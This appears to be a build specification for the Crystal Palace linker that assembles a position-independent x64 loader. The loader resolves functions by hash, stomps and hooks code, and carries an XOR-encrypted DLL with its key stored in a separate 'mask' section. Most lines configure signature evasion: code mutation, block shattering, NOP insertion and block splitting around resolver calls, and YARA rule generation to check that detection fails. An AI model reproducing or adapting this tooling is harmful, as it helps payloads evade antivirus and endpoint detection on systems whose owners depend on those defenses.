x64:
	
	load "../../build/loader.x64.o"        									# read the loader COFF
		make pic +gofirst +optimize +mutate +disco +regdance +blockparty +shatter		# BTF: full signature resilience cocktail

	load "../../build/stomp.x64.o"         									# read the stomp COFF
		merge

	run "../../crystal_palace/specs/services.spec"  				# run the services spec to merge the services PIC and resolve functions

	run "../../crystal_palace/specs/pico.spec"  						# run the pico spec to export the setup_hooks function and finalize the PIC
		link "pico"

	# ── Constant Blinding: limit magic pool so ised can target the scaffolding ──
	magic "0x7FFFFFFF, 0xD34DB33F, 0xCAFEBABE, 0xDEADC0DE"

	# ── ised: break content signatures around high-value instruction sequences ──
	# NOP sled after ror13 resolver calls — these are signature magnets
	pack $NOP "b" 0x90
	ised insert "call findModuleByHash" $NOP +safe
	ised insert "call findFunctionByHash" $NOP +safe

	# Split blocks at common prologue/epilogue patterns to fragment signature islands
	ised insert "CALL rel32" $NULL +split +last +after
	ised insert "MOV" "CALL rel32" $NULL +split +first +before

	# ── Yara rule generation: self-test signature resilience ──
	rule "" 10 3 10-16

	generate $KEY 128  																			# generate a random 128-byte key and assign it to the $KEY variable

	push $DLL
		xor $KEY    																					# xor the dll with the key
		preplen     																					# prepend its length
		link "dll"  																					# link it to the "dll" section

	push $KEY
		preplen      																					# prepend the key's length
		link "mask"  																					# link it to the "mask" section

	
	export  																								# export the final pic